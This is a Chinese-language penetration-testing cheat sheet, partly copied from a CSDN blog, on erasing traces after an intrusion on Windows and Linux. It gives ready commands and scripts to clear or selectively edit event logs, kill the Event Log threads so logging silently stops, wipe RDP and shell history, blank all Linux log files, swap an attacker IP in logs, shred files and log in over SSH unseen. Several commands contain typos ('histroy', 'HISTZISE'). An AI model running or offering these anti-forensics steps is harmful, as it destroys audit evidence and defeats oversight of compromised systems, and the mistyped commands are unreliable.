### 一、Windows

#### 1、常见日志

~~~shell
#应用程序日志文件：%systemroot%\system32\config\AppEvent.EVT;

#安全日志文件：%systemroot%\system32\config\SecEvent.EVT;

#系统日志文件：%systemroot%\system32\config\SysEvent.EVT;

#DNS日志默认位置：%sys temroot%\system32\config，默认文件大小512KB

#Internet信息服务FTP日志默认位置：%systemroot%\system32\logfiles\msftpsvc1\，默认每天一个日志;

#Internet信息服务WWW日志默认位置：%systemroot%\system32\logfiles\w3svc1\，默认每天一个日志;

#Scheduler服务日志默认位置：%sys temroot%\schedlgu.txt;
~~~

应用程序日志，安全日志，系统日志，DNS服务器日志，它们这些LOG文件在注册表中的：HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Eventlog
有的管理员很可能将这些日志重定位。其中EVENTLOG下面有很多的子表，里面可查到以上日志的定位目录。
Schedluler服务日志在注册表中HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SchedulingAgent

#### Windows日志清除

#### （1）wevtutil.exe

获取日志分类列表：

~~~
wevtutil el >1.txt
~~~

获取单个日志类别的统计信息：

~~~
wevtutil gli "windows powershell"
~~~

查看指定日志的具体内容：

~~~
wevtutil qe /f:text "windows powershell"
~~~

删除单个日志类别的所有信息：

~~~
wevtutil cl "windows powershell"
~~~

#### （2）NSA DanderSpiritz

统计日志列表，查询所有日志信息，包含时间，数目

~~~
eventlogquery -log Application
~~~

查看指定类别的日志内容

~~~
eventlogfilter -log Application -num 10
~~~

删除该类日志所有内容

~~~
eventlogclear -log Application
~~~

删除单条内容

~~~
eventlogedit -log Application -record 1
~~~

#### 绕过Windows日志

绕过原理：

Windows日志对应于eventlog服务，找到该服务对应的进程svchost.exe，进而筛选出svchost.exe进程中具体实现日志功能的线程，调用TerminateThread结束线程，破坏日志记录功能

特别的地方：

由于只结束了实现日志功能的线程，所以Windows Event Log服务没有被破坏，状态仍为正在运行
————————————————
版权声明：本文为CSDN博主「思源湖的鱼」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/weixin_44604541/article/details/119411191



（1）方法1
定位eventlog服务对应进程svchost.exe的pid
遍历该进程中的所有线程
判断线程是否满足条件
Windows Event Log 服务需要调用wevtsvc.dll，完整路径为%WinDir%\System32\wevtsvc.dll
并且，如果线程调用了wevtsvc.dll，就可以判读该线程实现了日志记录功能
结束线程
使用TerminateThread
恢复方法
结束进程svchost.exe
重新开启Windows Event Log 服务：net start eventlog
工具：https://github.com/hlldz/Phant0m
————————————————
版权声明：本文为CSDN博主「思源湖的鱼」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/weixin_44604541/article/details/119411191



（2）方法2
定位eventlog服务对应进程svchost.exe的pid
Get-WmiObject -Class win32_service -Filter "name = 'eventlog'" | select -exp ProcessId
1
找到svchost.exe的pid为7008
遍历该进程中的所有线程
使用PsList：pslist.exe /accepteula -d 7008
获取进程svchost.exe中的所有线程
判断线程是否满足条件
获取线程对应的服务，如果为eventlog，则满足条件
使用工具：ScTagQuery：sctagqry.exe -t 7928
根据返回的结果Service Tag，判断线程对应的服务
找到对应eventlog的线程
结束线程
调用TerminateThread
工具：https://github.com/3gstudent/Windows-EventLog-Bypass

#### 4、Metasploit

~~~
run clearlogs 
clearev #清除windows中的应用程序日志、系统日志、安全日志
~~~

#### 5、3389登陆记录清除

~~~
@echo off
@reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f
@del "%USERPROFILE%\My Documents\Default.rdp" /a
@exit
~~~

#### 6、清除recent

在文件资源管理器中点击“查看”->“选项”->在常规->隐私中点击”清除”按钮

或直接打开C:\Users\Administrator\Recent并删除所有内容

或在命令行中输入`del /f /s /q “%userprofile%\Recent*.*`

### 二，Linux

#### 1、清除命令历史记录

~~~
histroy -r          #删除当前会话历史记录
history -c          #删除内存中的所有命令历史
rm .bash_history   #删除历史文件中的内容
HISTZISE=0          #通过设置历史命令条数来清除所有历史记录

~~~

#### 2、在隐蔽的位置执行命令

~~~
:set history=0
:!command

~~~

#### 3、日志文件

~~~
/var/run/utmp 记录现在登入的用户
/var/log/wtmp 记录用户所有的登入和登出
/var/log/lastlog 记录每一个用户最后登入时间
/var/log/btmp 记录错误的登入尝试
/var/log/auth.log 需要身份确认的操作
/var/log/secure 记录安全相关的日志信息
/var/log/maillog 记录邮件相关的日志信息
/var/log/message 记录系统启动后的信息和错误日志
/var/log/cron 记录定时任务相关的日志信息
/var/log/spooler 记录UUCP和news设备相关的日志信息
/var/log/boot.log 记录守护进程启动和停止相关的日志消息
~~~

完全删除日志

~~~
cat /dev/null > filename
: > filename
> filename
echo "" > filename
echo > filename
~~~

针对性删除日志文件：

~~~
删除当天日志
sed  -i '/当天日期/'d  filename
~~~

篡改日志

~~~
将所有170.170.64.17ip替换为127.0.0.1
sed -i 's/170.170.64.17/127.0.0.1/g'
~~~

一键清除的bash脚本

~~~
#!/usr/bin/bash
echo > /var/log/syslog
echo > /var/log/messages
echo > /var/log/httpd/access_log
echo > /var/log/httpd/error_log
echo > /var/log/xferlog
echo > /var/log/secure
echo > /var/log/auth.log
echo > /var/log/user.log
echo > /var/log/wtmp
echo > /var/log/lastlog
echo > /var/log/btmp
echo > /var/run/utmp
rm ~/./bash_history
history -c
~~~

#### 4、文件删除

### （1）shred命令

实现安全的从硬盘上擦除数据，默认覆盖3次，通过 -n指定数据覆盖次数

~~~
shred -f -u -z -v -n 8 1.txt 
~~~

### （2）dd命令

~~~
dd if=/dev/zero of=要删除的文件 bs=大小 count=写入的次数
~~~

### （3）wipe

~~~
wipe filename
~~~

### （4）Secure-Delete

~~~
srm filename
sfill filename
sswap /dev/sda1
smem
~~~

#### 5、隐藏远程SSH登陆记录

隐身登录系统，不会被w、who、last等指令检测到

~~~
ssh -T root@192.168.0.1 /bin/bash -i
~~~

不记录ssh公钥在本地.ssh目录中

~~~
ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i
~~~



首先执行set +o history取消shell历史命令记录，在使用history -d id 删除历史命令中set +o history记录,就可以进行接下来的渗透操作了























